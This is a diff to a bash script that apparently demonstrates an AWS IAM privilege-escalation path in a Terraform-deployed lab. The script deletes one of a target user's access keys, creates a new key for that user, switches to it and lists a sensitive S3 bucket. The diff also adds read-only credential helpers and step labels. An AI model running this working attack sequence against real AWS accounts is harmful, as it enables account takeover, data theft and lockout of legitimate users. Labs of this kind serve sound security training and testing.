@@ -68,20 +68,39 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
-unset AWS_SESSION_TOKEN
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
 
-# Verify starting user identity
+# [EXPLOIT] Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
+use_starting_creds
+
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -92,21 +111,23 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Discover target bucket
+# [OBSERVATION] Step 4: Discover target bucket
 echo -e "${YELLOW}Step 4: Discovering target bucket${NC}"
 TARGET_BUCKET="pl-sensitive-data-iam-003-${ACCOUNT_ID}"
 echo "Target bucket pattern: ${TARGET_BUCKET}-*"
 echo -e "${GREEN}✓ Identified target bucket${NC}\n"
 
-# Step 5: Verify we don't have bucket access yet
+# [EXPLOIT] Step 5: Verify we don't have bucket access yet
 echo -e "${YELLOW}Step 5: Verifying we don't have bucket access yet${NC}"
+use_starting_creds
 echo "Attempting to list S3 buckets..."
 show_cmd "Attacker" "aws s3 ls"
 if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
@@ -116,12 +137,13 @@ else
 fi
 echo ""
 
-# Step 6: List existing access keys for target user
+# [EXPLOIT] Step 6: List existing access keys for target user
 echo -e "${YELLOW}Step 6: Listing existing access keys for target user${NC}"
+use_starting_creds
 echo "Target user: $TARGET_USER"
 echo ""
 
-show_cmd "Attacker" "aws iam list-access-keys --user-name $TARGET_USER --output json"
+show_attack_cmd "Attacker" "aws iam list-access-keys --user-name $TARGET_USER --output json"
 ACCESS_KEYS_JSON=$(aws iam list-access-keys --user-name $TARGET_USER --output json)
 ACCESS_KEYS=$(echo "$ACCESS_KEYS_JSON" | jq -r '.AccessKeyMetadata[].AccessKeyId')
 KEY_COUNT=$(echo "$ACCESS_KEYS" | wc -l | xargs)
@@ -139,8 +161,9 @@ fi
 echo -e "${GREEN}✓ Confirmed: Target user is at AWS 2-key limit${NC}"
 echo -e "${BLUE}Cannot create a new key without deleting an existing one first${NC}\n"
 
-# Step 7: Delete one of the existing access keys
+# [EXPLOIT] Step 7: Delete one of the existing access keys
 echo -e "${YELLOW}Step 7: Deleting one of the existing access keys${NC}"
+use_starting_creds
 # Get the first key to delete
 KEY_TO_DELETE=$(echo "$ACCESS_KEYS" | head -n 1)
 echo "Deleting access key: $KEY_TO_DELETE"
@@ -156,8 +179,9 @@ aws iam delete-access-key \
 echo -e "${GREEN}✓ Successfully deleted access key${NC}"
 echo -e "${BLUE}This opens up a slot for creating a new key${NC}\n"
 
-# Step 8: Create new access key for target user
+# [EXPLOIT] Step 8: Create new access key for target user
 echo -e "${YELLOW}Step 8: Creating new access key for target user${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector..."
 echo ""
 
@@ -165,10 +189,18 @@ show_attack_cmd "Attacker" "aws iam create-access-key --user-name $TARGET_USER -
 NEW_ACCESS_KEY_JSON=$(aws iam create-access-key \
     --user-name $TARGET_USER \
     --output json)
+if [ $? -ne 0 ]; then
+    echo -e "${RED}Error: Failed to create access key (iam:CreateAccessKey denied)${NC}"
+    exit 1
+fi
 
 NEW_ACCESS_KEY_ID=$(echo "$NEW_ACCESS_KEY_JSON" | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_ACCESS_KEY=$(echo "$NEW_ACCESS_KEY_JSON" | jq -r '.AccessKey.SecretAccessKey')
 
+if [ -z "$NEW_ACCESS_KEY_ID" ] || [ "$NEW_ACCESS_KEY_ID" == "null" ]; then
+    echo -e "${RED}Error: Failed to extract access key from response${NC}"
+    exit 1
+fi
 echo "Created new access key: $NEW_ACCESS_KEY_ID"
 echo -e "${GREEN}✓ Successfully created access key for target user${NC}\n"
 
@@ -180,7 +212,7 @@ echo -e "${YELLOW}Waiting 15 seconds for access keys to initialize...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Keys initialized${NC}\n"
 
-# Step 9: Switch to target user credentials
+# [EXPLOIT] Step 9: Switch to target user credentials
 echo -e "${YELLOW}Step 9: Switching to target user credentials${NC}"
 unset AWS_SESSION_TOKEN
 export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
@@ -191,9 +223,9 @@ TARGET_USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_USER_IDENTITY"
 echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
 
-# Step 10: List buckets to find the exact bucket name
+# [OBSERVATION] Step 10: List buckets to find the exact bucket name
 echo -e "${YELLOW}Step 10: Finding the target bucket${NC}"
-show_cmd "Attacker" "aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-iam-003-')].Name" --output text"
+show_cmd "ReadOnly" "aws s3api list-buckets --query \"Buckets[?starts_with(Name, 'pl-sensitive-data-iam-003-')].Name\" --output text"
 FULL_BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-iam-003-')].Name" --output text)
 
 if [ -z "$FULL_BUCKET_NAME" ]; then
@@ -204,7 +236,7 @@ fi
 echo "Target bucket: $FULL_BUCKET_NAME"
 echo -e "${GREEN}✓ Found target bucket${NC}\n"
 
-# Step 11: Verify S3 bucket access
+# [EXPLOIT] Step 11: Verify S3 bucket access
 echo -e "${YELLOW}Step 11: Verifying S3 bucket access${NC}"
 echo "Attempting to list bucket contents..."
 
